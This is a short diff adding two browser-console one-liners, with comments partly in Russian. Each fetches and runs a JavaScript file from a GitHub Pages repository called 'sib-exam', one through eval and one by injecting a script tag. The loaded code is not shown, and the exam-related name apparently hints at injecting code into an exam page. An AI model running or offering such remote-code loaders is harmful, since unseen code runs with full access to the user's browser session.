@@ -1,0 +1,5 @@
+# === F12 ONELINER (GitHub Pages: grzlly/sib-exam) ===
+fetch('https://grzlly.github.io/sib-exam/f12.js').then(r=>r.text()).then(eval)
+
+# === F12 ONELINER (Короткий вариант через DOM script) ===
+document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://grzlly.github.io/sib-exam/f12.js?'+Date.now()}))
